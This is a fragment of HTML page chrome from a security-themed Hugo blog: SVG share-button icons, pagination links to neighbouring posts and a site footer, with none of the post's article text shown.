xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg></div></div></a><a class=resp-sharing-button__link href="whatsapp://send?text=Traceback%20https%3a%2f%2fsequr.be%2fblog%2f2020%2f03%2ftraceback%2f" target=_blank rel=noopener aria-label title="Share on whatsapp"><div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg></div></div></a></div><div class=pagination><div class=pagination__buttons><span class="button previous"><a href=https://sequr.be/blog/2020/03/pi-hole-vs-phishing/><span class=button__icon>←</span>
<span class=button__text>Pi-hole vs Phishing</span></a></span>
<span class="button next"><a href=https://sequr.be/blog/2020/03/challenge-write-ups/><span class=button__text>Challenge write-ups</span>
<span class=button__icon>→</span></a></span></div></div></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2019</span>
<span><a href=https://sequr.be>DezeStijn</a></span>
<span><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank rel=noopener>CC BY-NC-SA 4.0</a></span>
<span><a href=https://sequr.be/blog/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span><span>Made with &#10084; by <a href=https://github.com/rhazdon>Djordje Atlialp</a></span><span>Deployed using <a href=https://github.com/TheGroundZero/TheGroundZero.github.io title=TheGroundZero/TheGroundZero.github.io>GitHub Pages</a></span></div></div></footer></div><script type=text/javascript src=https://sequr.be/bundle.min.c90b8161416b87c69a8e02683b54ddd6edb90aea699648bf655e6cbc45b419b8e465d196e715772463dba35a6faf5decb2eb247480d38680484d54645b434570.js integrity="sha512-yQuBYUFrh8aajgJoO1Td1u25Cupplki/ZV5svEW0GbjkZdGW5xV3JGPbo1pvr13ssuskdIDThoBITVRkW0NFcA=="></script></body></html>